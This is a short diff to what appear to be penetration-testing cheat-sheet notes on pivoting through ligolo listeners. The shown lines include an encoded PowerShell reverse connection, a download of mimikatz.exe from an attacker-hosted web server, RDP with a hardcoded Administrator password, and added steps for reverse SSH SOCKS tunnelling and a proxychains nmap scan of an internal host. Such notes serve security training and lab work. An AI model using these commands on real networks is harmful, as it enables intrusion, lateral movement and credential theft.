@@ -83,3 +83,11 @@ Examples:
 - `0.0.0.0:4446` -> `127.0.0.1:4446` then `powershell -e base64enc($InternalIpForAgent01 $4446)`
 - `0.0.0.0:8081` -> `127.0.0.1:8081` then `iwr -uri http://$InternalIpForAgent01:8181/mimikatz.exe -outfile mimi.exe` (and `python3 -m http.server 8081` in `/var/www/html`)
 - `0.0.0.0:3389` -> `$IpForTarget02:3389` then `xfreerdp /u:Administrator /p:adminpass /v:$ExternalIpForAgent01`
+
+Reverse dynamic tunelling:
+- in ligolo: `listener_add --addr 0.0.0.0:22 --to 127.0.0.1:22`
+- on internal gateway02: `ssh -N -R 2222 kaliuser@$InternalIpForAgent01`
+- in `/etc/proxychains.conf`: `socks5 127.0.0.1 2222`
+- in Kali: `proxychains nmap -n -Pn -sT -vvv --top-ports=20 --open -oN nmap_tcp_deepinIP.txt $DeepInTargetIp03`
+
+
